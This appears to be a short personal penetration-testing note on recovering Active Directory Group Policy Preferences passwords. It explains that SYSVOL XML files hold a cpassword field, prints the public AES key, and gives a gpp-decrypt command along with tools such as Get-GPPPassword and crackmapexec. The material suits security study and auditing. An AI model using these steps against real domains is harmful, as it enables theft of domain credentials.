-- -
When a new GPP is created, an XML file is created in the SYSVOL share, which is readable by everyone in the domain. It can be used for a multitude of reasons, but of most interest, it holds a `cpassword` field.
`cpassword` is AES-256 encrypted but the AES private key is publicly available [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) or:
```
 4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
 f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```
### Decryption
Plenty of automation has been made to decrypt the cpassword.
- `gpp-decrypt`
```bash
gpp-decrypt <encrypted str>
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```
- [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
- GPP Metasploit Post Module
- [[Dark Arts/Tools/Active Directory/Linux/crackmapexec]]
	![[Dark Arts/Tools/Active Directory/Linux/crackmapexec#^1d481a]]
	
